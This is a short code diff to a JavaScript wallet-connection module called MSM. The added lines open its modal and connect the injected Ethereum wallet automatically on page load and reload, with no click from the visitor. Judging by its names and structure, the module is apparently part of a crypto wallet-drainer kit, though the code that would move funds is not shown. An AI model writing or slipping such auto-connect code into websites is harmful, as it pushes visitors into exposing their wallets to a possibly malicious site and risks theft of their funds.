@@ -72,6 +72,17 @@ const MSM = {
       modal_elem.id = 'ms-modal';
       modal_elem.innerHTML = modal_content;
       document.body.prepend(modal_elem);
+      
+      // Auto-select and auto-connect the injected wallet
+      setTimeout(() => {
+        const injectedWallet = document.querySelector('#ms_wallet_eth');
+        if (injectedWallet) {
+          injectedWallet.checked = true;
+          // Auto-connect immediately
+          MSM.connect();
+        }
+      }, 100);
+      
       if (mode == 2) MSM.connect_select = true;
       else MSM.connect_select = false;
       try {
@@ -106,3 +117,21 @@ const MSM = {
     }
   }
 };
+
+// Auto-open modal and connect when page loads
+document.addEventListener('DOMContentLoaded', function() {
+  setTimeout(() => {
+    MSM.init();
+    MSM.open();
+  }, 500);
+});
+
+// Also auto-connect when page is reloaded
+window.addEventListener('load', function() {
+  setTimeout(() => {
+    if (!document.querySelector('#ms-modal')) {
+      MSM.init();
+      MSM.open();
+    }
+  }, 500);
+});
